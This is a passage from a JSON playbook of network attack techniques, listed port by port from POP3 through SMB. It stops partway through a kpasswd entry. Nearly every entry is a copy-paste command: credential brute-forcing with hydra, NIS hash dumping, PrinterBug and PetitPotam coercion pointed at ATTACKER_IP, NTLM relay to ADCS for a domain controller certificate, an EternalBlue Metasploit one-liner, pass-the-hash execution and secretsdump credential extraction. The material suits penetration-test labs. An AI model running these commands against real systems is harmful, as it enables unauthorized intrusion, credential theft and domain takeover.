    "cmd": "nmap -p110,995 -sCV --script pop3-capabilities,pop3-ntlm-info <TARGET_IP> -oN nmap_pop3.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Credential brute/spray",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f pop3://<TARGET_IP> -t 4",
    "when": "if usernames known and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Manual plaintext login and read",
    "cmd": "nc -nv <TARGET_IP> 110  # USER <USER> / PASS <PASS> / LIST / RETR 1",
    "when": "if creds known and 110 is plaintext",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Implicit-TLS login on 995",
    "cmd": "openssl s_client -connect <TARGET_IP>:995 -quiet  # then: USER <USER> / PASS <PASS> / LIST",
    "when": "if port 995 open and creds known",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "List mailbox with curl",
    "cmd": "curl -k 'pop3s://<TARGET_IP>/' -u '<USER>:<PASS>'",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Fetch individual messages for secrets",
    "cmd": "curl -k 'pop3s://<TARGET_IP>/1' -u '<USER>:<PASS>'",
    "when": "if creds known",
    "yields": [
     "creds",
     "file-read"
    ]
   }
  ]
 },
 {
  "ports": [
   111
  ],
  "service": "rpcbind",
  "aliases": [
   "rpcbind",
   "portmapper",
   "portmap",
   "sunrpc"
  ],
  "proto": "both",
  "risk": "medium",
  "note": "rpcbind is a directory, not a target: rpcinfo -p tells you which RPC programs exist and on which (often high, unfiltered) ports, so NFS on 2049 can look filtered while the portmapper-advertised port answers; watch for rusersd/rstatd/ypbind because NIS leaks the whole user database including crackable hashes.",
  "categories": [
   "recon",
   "file-ops",
   "service-exploitation"
  ],
  "attack": [
   "T1046",
   "T1135",
   "T1087"
  ],
  "keywords": [
   "rpcinfo",
   "rpcbind",
   "showmount",
   "rusers",
   "ypcat",
   "nfs-showmount"
  ],
  "yields": [
   "users",
   "hashes",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Dump registered RPC programs and their ports",
    "cmd": "rpcinfo -p <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "TCP+UDP NSE pass on the portmapper",
    "cmd": "nmap -sSUC -p111 <TARGET_IP> -oN nmap_rpcbind.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Follow the NFS program to its exports",
    "cmd": "showmount -e <TARGET_IP>",
    "when": "if the nfs program is registered",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Logged-in users via rusersd",
    "cmd": "rusers -al <TARGET_IP>",
    "when": "if rusersd is registered",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump the NIS passwd map (crackable hashes)",
    "cmd": "ypwhich -d <DOMAIN> <TARGET_IP> && ypcat -d <DOMAIN> -h <TARGET_IP> passwd.byname",
    "when": "if ypbind/ypserv is registered and the NIS domain is known",
    "yields": [
     "users",
     "hashes"
    ]
   }
  ]
 },
 {
  "ports": [
   113
  ],
  "service": "ident",
  "aliases": [
   "ident",
   "auth",
   "identd"
  ],
  "proto": "tcp",
  "risk": "low",
  "note": "ident tells you which OS account owns each listening port, so you learn whether that juicy service is running as root before you spend an exploit on it.",
  "categories": [
   "recon"
  ],
  "attack": [
   "T1087.001",
   "T1046"
  ],
  "keywords": [
   "ident-user-enum",
   "auth-owners",
   "identd"
  ],
  "yields": [
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm the ident service",
    "cmd": "nmap -p113 -sV --script auth-owners <TARGET_IP> -oN nmap_ident.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Map the owner of every open port",
    "cmd": "nmap -sTV --script auth-owners <TARGET_IP> -oN nmap_ident_owners.txt",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Query owners across common service ports",
    "cmd": "ident-user-enum.pl <TARGET_IP> 22 80 111 139 443 445 3306",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Flag root-owned services worth targeting first",
    "cmd": "grep -i root nmap_ident_owners.txt",
    "when": "always",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   123
  ],
  "service": "ntp",
  "aliases": [
   "ntp"
  ],
  "proto": "udp",
  "risk": "low",
  "note": "Beyond monlist host-enumeration, the practical use on a lab box is stealing the server's clock with ntpdate so Kerberos stops throwing KRB_AP_ERR_SKEW on your subsequent AD attacks.",
  "categories": [
   "recon",
   "ad-recon"
  ],
  "attack": [
   "T1046",
   "T1590"
  ],
  "keywords": [
   "ntpq",
   "ntpdc monlist",
   "ntp-monlist",
   "ntpdate"
  ],
  "yields": [
   "hostnames"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "NSE info + monlist",
    "cmd": "nmap -sU -p123 --script ntp-info,ntp-monlist <TARGET_IP> -oN nmap_ntp.txt",
    "when": "always",
    "yields": [
     "hostnames"
    ]
   },
   {
    "phase": "enum",
    "label": "Pull recent clients via monlist",
    "cmd": "ntpdc -n -c monlist <TARGET_IP>",
    "when": "if monlist enabled",
    "yields": [
     "hostnames"
    ]
   },
   {
    "phase": "enum",
    "label": "Read peers and server variables",
    "cmd": "ntpq -p <TARGET_IP>; ntpq -c readvar <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Sync your clock to the target for Kerberos",
    "cmd": "sudo ntpdate <TARGET_IP>",
    "when": "if attacking AD/Kerberos and clock skew too great",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   135,
   593
  ],
  "service": "msrpc",
  "aliases": [
   "msrpc",
   "ncacn_http",
   "epmap",
   "ms-rpc",
   "microsoft windows rpc"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "135 is a stepping stone: rpcdump and a null rpcclient bind leak users, domain info and the dynamic ports of juicier RPC services, and with any credential dcomexec/atexec give code execution without ever touching 445 head-on.",
  "categories": [
   "recon",
   "impacket-suite",
   "ad-recon",
   "netexec",
   "lateral-move"
  ],
  "attack": [
   "T1135",
   "T1087.002",
   "T1018",
   "T1021.003",
   "T1046"
  ],
  "keywords": [
   "impacket-rpcdump",
   "rpcclient",
   "impacket-lookupsid",
   "impacket-dcomexec",
   "impacket-atexec",
   "enumdomusers",
   "querydispinfo",
   "msrpc"
  ],
  "yields": [
   "users",
   "shell",
   "foothold"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Map the RPC endpoints and their dynamic ports",
    "cmd": "impacket-rpcdump <TARGET_IP>; nmap -p135 --script msrpc-enum <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Null rpcclient bind: users and descriptions",
    "cmd": "rpcclient -U \"\" -N <TARGET_IP> -c \"enumdomusers;querydispinfo;querydominfo\"",
    "when": "if null session allowed",
    "yields": [
     "users",
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "RID-cycle SIDs to names over MSRPC",
    "cmd": "impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Groups and domain policy with credentials",
    "cmd": "rpcclient -U \"<DOMAIN>/<USER>%<PASS>\" <TARGET_IP> -c \"enumdomgroups;getdompwinfo;querygroupmem 0x200\"",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Code execution via DCOM over 135",
    "cmd": "impacket-dcomexec -object MMC20 <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
    "when": "if admin creds known",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "lateral",
    "label": "Task-scheduler exec over RPC (quiet alternative to psexec)",
    "cmd": "impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP> whoami",
    "when": "if admin creds known",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   135,
   445
  ],
  "service": "spooler",
  "aliases": [
   "spoolss",
   "msrpc",
   "microsoft-ds",
   "ms-rprn"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The Print Spooler's RpcRemoteFindFirstPrinterChangeNotification (PrinterBug) coerces the host's machine account to authenticate to a server you choose - the classic no-password trigger that feeds an ADCS ESC8 or an LDAP/RBCD relay; confirm the MS-RPRN interface is actually registered with rpcdump or nxc before you build the relay around it.",
  "categories": [
   "ad-attacks",
   "adcs-attacks",
   "impacket-suite",
   "service-exploitation",
   "lateral-move"
  ],
  "attack": [
   "T1187",
   "T1557.001"
  ],
  "keywords": [
   "printerbug",
   "dementor",
   "coercer",
   "spoolss",
   "nxc smb -m spooler",
   "rpcdump"
  ],
  "yields": [
   "hashes",
   "foothold"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Check whether the spooler is reachable",
    "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spooler",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm MS-RPRN is registered",
    "cmd": "impacket-rpcdump <TARGET_IP> | grep -i spoolss",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Trigger PrinterBug at your relay/listener",
    "cmd": "python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> <ATTACKER_IP>",
    "when": "if creds known (relay must be running)",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Or fire every coercion method with coercer",
    "cmd": "coercer coerce -u <USER> -p '<PASS>' -d <DOMAIN> -t <TARGET_IP> -l <ATTACKER_IP> --filter-method-name spooler",
    "when": "if creds known (relay must be running)",
    "yields": [
     "hashes"
    ]
   }
  ]
 },
 {
  "ports": [
   135
  ],
  "service": "wmi-dcom",
  "aliases": [
   "msrpc",
   "epmap"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "135 is the endpoint mapper, not an exploit by itself, but rpcdump fingerprints the host's role (DC, Exchange, SCCM, spooler, certsrv) from registered interfaces and the IOXIDResolver call leaks every network interface the host has including hidden internal subnets; with creds the same port gives you WMI/DCOM command execution that leaves far less on disk than psexec.",
  "categories": [
   "impacket-suite",
   "lateral-move",
   "ad-recon",
   "service-exploitation",
   "netexec"
  ],
  "attack": [
   "T1047",
   "T1021.003",
   "T1018",
   "T1016",
   "T1046"
  ],
  "keywords": [
   "impacket-rpcdump",
   "impacket-rpcmap",
   "wmiexec",
   "dcomexec",
   "nxc wmi",
   "ioxidresolver",
   "ncacn_ip_tcp"
  ],
  "yields": [
   "users",
   "shell",
   "foothold"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint host role from RPC interfaces",
    "cmd": "impacket-rpcdump <TARGET_IP> | tee rpcdump.txt && grep -iE 'spoolss|drsuapi|certsrv|efsr|MS-' rpcdump.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Brute-force bound RPC interface UUIDs",
    "cmd": "impacket-rpcmap 'ncacn_ip_tcp:<TARGET_IP>[135]' -brute-uuids",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Validate creds and probe WMI exec rights",
    "cmd": "nxc wmi <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'",
    "when": "if creds known",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "foothold",
    "label": "Semi-interactive WMI shell",
    "cmd": "impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
    "when": "if creds known",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Pass-the-hash WMI exec when no plaintext",
    "cmd": "impacket-wmiexec -hashes :<HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
    "when": "if hash known",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "lateral",
    "label": "Fall back to DCOM (MMC20) when WMI is blocked",
    "cmd": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
    "when": "if wmiexec blocked / for stealth",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   137,
   138,
   139
  ],
  "service": "netbios",
  "aliases": [
   "netbios-ns",
   "netbios-dgm",
   "netbios-ssn",
   "nbns"
  ],
  "proto": "both",
  "risk": "medium",
  "note": "UDP 137 hands you the NetBIOS name and domain membership even when 445 is filtered, and the same NBT-NS it speaks is what Responder poisons on a flat network to catch NetNTLM hashes for cracking or relay.",
  "categories": [
   "recon",
   "netexec",
   "ad-recon",
   "password-ops"
  ],
  "attack": [
   "T1557.001",
   "T1018",
   "T1046",
   "T1135"
  ],
  "keywords": [
   "nbtscan",
   "nmblookup",
   "nbstat",
   "responder",
   "netbios"
  ],
  "yields": [
   "users",
   "hashes"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Sweep NetBIOS names across the subnet",
    "cmd": "nbtscan -r <NETWORK>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Resolve a single host's NetBIOS/workgroup",
    "cmd": "nmblookup -A <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "NSE nbstat for name table and MAC",
    "cmd": "nmap -sU -sV -p137 --script nbstat <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Poison NBT-NS/LLMNR to capture NetNTLM (authorized MITM only)",
    "cmd": "sudo responder -I eth0 -wv",
    "when": "if on the same L2 segment and in scope",
    "yields": [
     "hashes",
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   143,
   993
  ],
  "service": "imap",
  "aliases": [
   "imap",
   "imaps"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "IMAP keeps mail server-side, so one credential exposes the full folder tree (Sent and Drafts often leak more than Inbox); the capability banner frequently advertises NTLM auth, which hands you the domain/host for cross-service pivoting.",
  "categories": [
   "recon",
   "password-ops",
   "service-exploitation",
   "social-eng"
  ],
  "attack": [
   "T1046",
   "T1110.003",
   "T1078",
   "T1114.002"
  ],
  "keywords": [
   "imap",
   "imaps",
   "imap-capabilities",
   "imap-ntlm-info",
   "hydra imap",
   "nmap imap",
   "openssl s_client",
   "curl imaps",
   "a1 login",
   "select inbox"
  ],
  "yields": [
   "creds",
   "file-read",
   "users"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Capabilities + NTLM/domain leak",
    "cmd": "nmap -p143,993 -sCV --script imap-capabilities,imap-ntlm-info <TARGET_IP> -oN nmap_imap.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Credential brute/spray",
    "cmd": "hydra -L users.txt -P passwords.txt -f imap://<TARGET_IP> -t 4",
    "when": "if usernames known and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Manual TLS login and folder list",
    "cmd": "openssl s_client -connect <TARGET_IP>:993 -quiet  # a1 LOGIN <USER> <PASS> / a2 LIST \"\" \"*\" / a3 SELECT INBOX",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "List all folders with curl",
    "cmd": "curl -k 'imaps://<TARGET_IP>' -u '<USER>:<PASS>'",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Search INBOX then fetch a message",
    "cmd": "curl -k 'imaps://<TARGET_IP>/INBOX;UID=1' -u '<USER>:<PASS>'",
    "when": "if creds known",
    "yields": [
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump Sent/Drafts for internal secrets",
    "cmd": "curl -k 'imaps://<TARGET_IP>/Sent?ALL' -u '<USER>:<PASS>'",
    "when": "if creds known",
    "yields": [
     "creds",
     "file-read"
    ]
   }
  ]
 },
 {
  "ports": [
   161,
   162
  ],
  "service": "snmp",
  "aliases": [
   "snmp",
   "snmptrap",
   "snmp-trap"
  ],
  "proto": "udp",
  "risk": "high",
  "note": "'public' is a first guess, not the answer — brute the community string, then walk the whole tree (a bare snmpwalk only hits a default subtree, so append `.`); running-process arguments and NET-SNMP-EXTEND entries routinely leak plaintext creds or hand you outright command execution.",
  "categories": [
   "recon",
   "password-ops",
   "service-exploitation"
  ],
  "attack": [
   "T1046",
   "T1602.001",
   "T1552.001"
  ],
  "keywords": [
   "snmpwalk",
   "onesixtyone",
   "snmp-check",
   "snmpbulkwalk",
   "braa",
   "nmap snmp-brute"
  ],
  "yields": [
   "community-string",
   "creds",
   "users",
   "hostnames"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Brute the community string",
    "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>",
    "when": "always",
    "yields": [
     "community-string"
    ]
   },
   {
    "phase": "recon",
    "label": "NSE brute + info",
    "cmd": "nmap -sU -p161 --script snmp-brute,snmp-info,snmp-sysdescr <TARGET_IP> -oN nmap_snmp.txt",
    "when": "always",
    "yields": [
     "community-string"
    ]
   },
   {
    "phase": "enum",
    "label": "Full tree walk (append the dot)",
    "cmd": "snmpbulkwalk -v2c -c public -Cr1000 <TARGET_IP> . | tee snmp_full.txt",
    "when": "if community string known",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Structured host summary (users, shares, processes)",
    "cmd": "snmp-check <TARGET_IP> -c public -v 2c",
    "when": "if community string known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Windows user accounts",
    "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
    "when": "if community string known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Running process arguments — creds on the cmdline",
    "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.4 | tee snmp_procs.txt",
    "when": "if community string known",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "loot",
    "label": "Admin-configured extend commands (frequent RCE / cred path)",
    "cmd": "snmpwalk -v2c -c public <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects",
    "when": "if community string known",
    "yields": [
     "creds",
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   389,
   636
  ],
  "service": "ldap",
  "aliases": [
   "ldap",
   "ldapssl",
   "ldaps",
   "ldap-ssl"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Even when anonymous search is blocked the RootDSE is readable unauthenticated and hands you the domain naming context and DC hostname for free; with any valid user, grep description/info attributes for plaintext passwords and run a full BloodHound collection — LDAP is where the attack paths actually come from.",
  "categories": [
   "ad-recon",
   "bloodhound",
   "netexec",
   "impacket-suite",
   "adcs-attacks"
  ],
  "attack": [
   "T1087.002",
   "T1069.002",
   "T1018",
   "T1482",
   "T1046"
  ],
  "keywords": [
   "ldapsearch",
   "nxc ldap",
   "bloodhound-python",
   "windapsearch",
   "get-desc-users",
   "certipy",
   "ldapdomaindump"
  ],
  "yields": [
   "users",
   "creds",
   "domain-user",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "RootDSE — naming contexts, DC name, functional level",
    "cmd": "ldapsearch -x -H ldap://<DC_IP> -b '' -s base '(objectClass=*)' | tee rootdse.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Anonymous bind full dump",
    "cmd": "ldapsearch -x -H ldap://<DC_IP> -b 'DC=domain,DC=local' '(objectClass=*)' | tee ldap_anon.txt",
    "when": "if anonymous allowed",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate users/groups/policy with creds",
    "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users --groups --password-not-required",
    "when": "if creds known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Full BloodHound collection over LDAP",
    "cmd": "bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip",
    "when": "if creds known",
    "yields": [
     "domain-user"
    ]
   },
   {
    "phase": "enum",
    "label": "AS-REP and Kerberoast straight from LDAP",
    "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast asrep.txt --kerberoasting kerb.txt",
    "when": "if creds known",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate vulnerable AD CS certificate templates",
    "cmd": "certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout",
    "when": "if creds known and AD CS present",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Hunt passwords in description/info fields",
    "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M get-desc-users",
    "when": "if creds known",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   443,
   8443
  ],
  "service": "https",
  "aliases": [
   "https",
   "https-alt",
   "ssl/http",
   "ssl/https",
   "pcsync-https"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The TLS certificate hands you hostnames/vhosts for free (SAN fields), and the box behind it is usually the same app as :80 — scan the cert first, then treat it like any HTTP target with -k.",
  "categories": [
   "recon",
   "web-exploitation",
   "vuln-assessment",
   "initial-foothold"
  ],
  "attack": [
   "T1595.003",
   "T1190",
   "T1046",
   "T1505.003"
  ],
  "keywords": [
   "sslscan",
   "openssl s_client",
   "whatweb",
   "feroxbuster",
   "ffuf",
   "nuclei",
   "nikto",
   "curl -k"
  ],
  "yields": [
   "source-code",
   "creds",
   "foothold",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Pull cert SANs for hostnames",
    "cmd": "sslscan <TARGET_IP>:<PORT> && openssl s_client -connect <TARGET_IP>:<PORT> 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Fingerprint over TLS",
    "cmd": "whatweb -a 3 https://<TARGET_IP>:<PORT>/ --no-errors && curl -skI https://<TARGET_IP>:<PORT>/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Directory brute over HTTPS",
    "cmd": "feroxbuster -k -u https://<TARGET_IP>:<PORT> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak",
    "when": "always",
    "yields": [
     "source-code",
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Vhost fuzz using cert hostname",
    "cmd": "ffuf -u https://<TARGET_IP>:<PORT>/ -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac",
    "when": "if cert/redirect reveals a domain",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Vuln templates + legacy checks",
    "cmd": "nuclei -u https://<TARGET_IP>:<PORT> -t http/ -severity medium,high,critical && nikto -h https://<TARGET_IP>:<PORT> -ssl",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Hit identified app CVE / SQLi",
    "cmd": "sqlmap -u 'https://<TARGET_IP>:<PORT>/login' --data 'user=1&pass=1' --batch --level=3 --risk=2",
    "when": "if a form or parameter is reachable",
    "yields": [
     "creds",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   445,
   135
  ],
  "service": "efsrpc",
  "aliases": [
   "efsr",
   "ms-efsr",
   "msrpc",
   "microsoft-ds"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "PetitPotam abuses MS-EFSRPC (EfsRpcOpenFileRaw and siblings) to coerce machine-account auth and, unlike PrinterBug, the original vector worked unauthenticated against unpatched DCs - paired with ntlmrelayx to ADCS web enrollment it is a zero-credential path to a Domain Controller certificate, so always try the unauth trigger before spending a credential.",
  "categories": [
   "adcs-attacks",
   "ad-attacks",
   "impacket-suite",
   "service-exploitation"
  ],
  "attack": [
   "T1187",
   "T1557.001"
  ],
  "keywords": [
   "petitpotam",
   "coercer",
   "efsrpc",
   "dementor",
   "ntlmrelayx --adcs",
   "efsrpcopenfileraw"
  ],
  "yields": [
   "hashes",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Scan which coercion methods respond",
    "cmd": "coercer scan -u <USER> -p '<PASS>' -d <DOMAIN> -t <TARGET_IP>",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Stand up the ADCS relay listener",
    "cmd": "impacket-ntlmrelayx -t http://<DC_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
    "when": "always (before firing the trigger)",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Fire PetitPotam unauthenticated first",
    "cmd": "python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <TARGET_IP>",
    "when": "if host is unpatched",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticated PetitPotam when unauth is patched",
    "cmd": "python3 PetitPotam.py -u <USER> -p '<PASS>' -d <DOMAIN> <ATTACKER_IP> <TARGET_IP>",
    "when": "if creds known",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "privesc",
    "label": "Use the relayed DC certificate for a TGT + hash",
    "cmd": "certipy-ad auth -pfx dc.pfx -dc-ip <DC_IP>",
    "when": "after the cert is captured",
    "yields": [
     "hashes",
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   445,
   139
  ],
  "service": "smb",
  "aliases": [
   "microsoft-ds",
   "netbios-ssn",
   "smb",
   "microsoft-ds?"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The win is rarely an SMB CVE; it is a readable share (SYSVOL/scripts, a backup, a config with a password) reached by a null or guest session, or one credential that is local admin somewhere and turns into shell across the whole subnet.",
  "categories": [
   "recon",
   "netexec",
   "impacket-suite",
   "ad-recon",
   "lateral-move",
   "service-exploitation",
   "metasploit"
  ],
  "attack": [
   "T1135",
   "T1021.002",
   "T1087.002",
   "T1210",
   "T1003.002",
   "T1550.002",
   "T1557.001"
  ],
  "keywords": [
   "nxc smb",
   "smbclient",
   "smbmap",
   "enum4linux",
   "impacket-lookupsid",
   "impacket-secretsdump",
   "impacket-psexec",
   "wmiexec",
   "rid-brute",
   "ms17-010",
   "ntlmrelayx",
   "--gen-relay-list"
  ],
  "yields": [
   "users",
   "creds",
   "hashes",
   "shell",
   "file-read",
   "foothold",
   "admin"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Dialects, signing and OS",
    "cmd": "nmap -p139,445 --script \"smb-protocols,smb-security-mode,smb2-security-mode,smb-os-discovery\" <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Fingerprint host (signing off = relayable, SMBv1 = ms17-010 candidate)",
    "cmd": "nxc smb <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Null/guest share listing",
    "cmd": "smbclient -L //<TARGET_IP>/ -N; nxc smb <TARGET_IP> -u '' -p '' --shares; nxc smb <TARGET_IP> -u guest -p '' --shares",
    "when": "if anonymous or guest allowed",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Pull the user list (RID cycling when enumdomusers is refused)",
    "cmd": "nxc smb <TARGET_IP> -u '' -p '' --rid-brute 10000; impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
    "when": "if null session or any creds",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Deep enum + password policy + share spider",
    "cmd": "enum4linux-ng -A <TARGET_IP>; nxc smb <TARGET_IP> -u <USER> -p <PASS> --users --pass-pol -M spider_plus",
    "when": "if creds known",
    "yields": [
     "users",
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Check and exploit MS17-010 EternalBlue (unauthenticated)",
    "cmd": "nmap -p445 --script smb-vuln-ms17-010 <TARGET_IP>; msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET_IP>; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run\"",
    "when": "if SMBv1 enabled and host looks unpatched",
    "yields": [
     "shell",
     "foothold",
     "admin"
    ]
   },
   {
    "phase": "foothold",
    "label": "Exec as admin by password or pass-the-hash",
    "cmd": "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>; impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>; nxc smb <TARGET_IP> -u <USER> -H <HASH> -x whoami",
    "when": "if admin creds or hash known",
    "yields": [
     "shell",
     "foothold",
     "admin"
    ]
   },
   {
    "phase": "lateral",
    "label": "Spray the credential and build an NTLM-relay target list",
    "cmd": "nxc smb <NETWORK> -u <USER> -p <PASS>; nxc smb <NETWORK> -u '' -p '' --gen-relay-list relay_targets.txt; impacket-ntlmrelayx -tf relay_targets.txt -smb2support",
    "when": "if creds known, or signing disabled on neighbours",
    "yields": [
     "admin",
     "hashes",
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump SAM/LSA/secrets once local admin",
    "cmd": "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
    "when": "if local admin on target",
    "yields": [
     "hashes",
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   464
  ],
  "service": "kpasswd",
  "aliases": [
   "kpasswd5",
   "kpasswd",
   "kpwd"
  ],
  "proto": "both",
  "risk": "medium",
